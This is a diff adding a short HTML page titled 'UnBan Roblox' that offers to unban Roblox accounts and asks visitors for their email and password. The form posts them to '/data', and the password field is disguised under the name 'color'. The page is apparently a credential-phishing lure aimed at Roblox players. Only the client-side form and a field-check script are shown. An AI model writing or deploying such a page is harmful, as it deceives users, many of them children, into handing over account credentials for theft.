@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>UnBan Roblox</title>
+</head>
+
+<body>
+
+<h2>UnBanRoblox</h2>
+
+<form method="POST" action="/data">
+    <input type="text" name="name" placeholder="Email">
+    <br><br>
+
+    <input type="text" name="color" placeholder="Password">
+    <br><br>
+
+    <button type="submit" onclick="return checkFields()">Login</button>
+</form>
+<script>
+function checkFields() {
+    let name = document.querySelector('input[name="name"]').value.trim();
+    let color = document.querySelector('input[name="color"]').value.trim();
+
+    if (name === "" && color === "") {
+        alert("Error: You haven't added a password.");
+        return false;
+    }
+
+    if (name === "") {
+        alert("Error: You haven't added an email address!");
+        return false;
+    }
+
+    if (color === "") {
+        alert("Error: You haven't added a password!");
+        return false;
+    }
+
+    return true;
+}
+</script>
+</body>
+</html>
